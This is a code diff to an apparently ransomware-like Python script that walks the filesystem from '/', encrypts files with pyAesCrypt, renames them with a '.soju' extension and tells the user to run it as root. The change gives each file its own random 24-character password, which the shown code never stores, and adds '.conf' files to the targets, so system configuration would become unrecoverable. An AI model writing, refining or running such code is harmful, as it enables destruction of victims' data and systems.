@@ -35,9 +35,10 @@ def encrypt(files):
     encrypted_files = []
 
     bufferSize = 64*1024
-    password = ''.join(random.choices(string.ascii_letters + string.digits + "/?!@#$%^&*()-=+", k=24))
 
     for file in files:
+        password = ''.join(random.choices(string.ascii_letters + string.digits + "/?!@#$%^&*()-=+", k=24))
+
         try:
             encFile = file + ".soju"
             pyAesCrypt.encryptFile(file, encFile, password, bufferSize)
@@ -90,7 +91,7 @@ def main():
 
     print ("\n <<< REMEMBER TO RUN WITH HIGHEST PRIVILEGE (sudo, root, etc...) >>> \n")
 
-    extensions = (".cnf", ".tar")   # Add lots more if you want to 
+    extensions = (".conf", ".cnf", ".tar")   # Add lots more if you want to 
 
     # Get all .cnf files from /etc directory
     starting_path = "/"     
